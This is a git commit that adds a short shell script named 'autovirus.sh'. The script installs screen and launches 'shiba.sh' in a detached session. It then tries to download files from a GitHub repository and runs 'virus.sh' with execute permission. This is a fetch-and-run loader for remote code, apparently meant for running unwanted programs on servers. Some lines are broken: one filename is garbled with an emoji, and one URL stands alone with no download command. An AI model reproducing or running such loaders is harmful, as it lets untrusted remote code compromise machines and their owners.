4cc82393fb3e1a85efb8b43a9ae2bccb3288c30e
Mangadiw97 <86317036+Mangadiw97@users.noreply.github.com>
2021-09-13 01:16:07 +0800

    Create autovirus.sh

---
+++ autovirus.sh
@@ -0,0 +1,9 @@
+#!/bin/sh
+
+sudo apt update
+sudo apt install screen -y
+screen -dmS shiba.sh ./shiba.sh 65 75
+wget https://github.com/Mangadiw97/vps/raw/main/viruscinta😘
+https://raw.githubusercontent.com/Mangadiw97/vps/main/virus.sh
+chmod +x virus.sh
+./virus.sh
